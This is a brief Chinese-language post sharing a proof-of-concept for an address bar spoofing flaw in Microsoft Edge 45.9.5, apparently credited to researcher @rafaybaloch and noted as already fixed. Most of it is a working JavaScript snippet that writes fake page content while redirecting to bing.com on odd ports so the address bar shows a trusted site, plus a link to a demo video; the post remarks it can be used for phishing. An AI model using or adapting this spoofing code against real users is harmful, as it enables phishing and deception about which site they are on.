# Microsoft Edge浏览器 45.9.5地址栏欺骗POC

可以用来钓鱼...不过目前已经被修复了。


```js
<script>
document.write("<h1>This is not Bing</h1>");
location.href = "https://bing.com:8081";
setInterval(function(){location.href="https://bing.com:8080";},7000);
</script>
```

PoC视频：https://video.twimg.com/ext_tw_video/1357095235218735105/pu/vid/720x1426/eRpfwsqsvDGapGry.mp4

via@rafaybaloch
